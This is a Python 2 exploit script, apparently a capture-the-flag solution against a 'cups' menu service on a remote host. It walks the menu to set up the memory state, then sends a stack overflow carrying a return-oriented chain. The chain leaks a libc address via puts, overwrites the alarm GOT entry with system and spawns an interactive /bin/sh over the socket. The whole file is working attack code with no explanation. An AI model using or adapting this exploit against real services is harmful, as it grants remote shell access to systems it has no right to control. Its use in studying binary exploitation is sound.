import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random


import sys
LOCAL = ('localhost',31336)
LOCAL = (sys.argv[1],31334)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096





s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=0):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

recv_until('cups>')
s.send('100\n')

data = recv_until('No way, sir. There is a long queue, please take').split('No way, sir. There is a long queue, please take ')[1][:2]
max_cups = int(data)

print 'max:',max_cups


s.send('5\n')

n = 0

for i in range(max_cups):
    recv_until('size>')
    s.send('2\n')
    s.send('a\n')
    recv_until('>>')
    s.send('1\n')
    recv_until('>')
    if i == max_cups-1:
        print 'end'
        s.send('yes\x00\x00\x00\x00\x00\n')
    else:
        s.send('yes\n')
    n += 1



for i in range(max_cups):
    if n > 9:
        break
    recv_until('size>')
    s.send('2\n')
    s.send('a\n')
    recv_until('>>')
    s.send('1\n')
    recv_until('>')
    if i == max_cups-1:
        print 'end'
        s.send('yes\x00\x00\x00\x00\x00\n')
    else:
        s.send('yes\n')
    n += 1


recv_until('size>',1)
s.send('128\n')
payload = 'A'*20

puts_got = 0x804B030
pop1_ret = 0x8048d52
pop2_ret = 0x8048d51
pop3_ret = 0x08048d50

payload += pack('<III',0x080485F0,pop1_ret,puts_got)
payload += pack('<IIIII',0x08048570,pop3_ret,0,0x804B020,4) #read
payload += pack('<IIIII',0x08048570,pop3_ret,0,0x0804b000,0x100) #read
payload += pack('<III',0x080485B0,pop1_ret,0x0804b000) # alarm == system
payload = payload.ljust(128,'A')
s.send(payload+'\n')
s.send('1\n1\n')
data = recv_until('\x04\x08')
# data += s.recv(BUFFER)
print repr(data[-5:-1])

srandom_ = unpack('<I',data[-5:-1])[0] # srandom

print 'srandom_:',hex(srandom_)

system_ = srandom_ + 0xc960
system_ = srandom_ + 0x22860 # lib_start_main libc.2.23
print 'system:',hex(system_)
raw_input("?")

s.send(pack('<I',system_)+'/bin/sh\x00\n')




t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
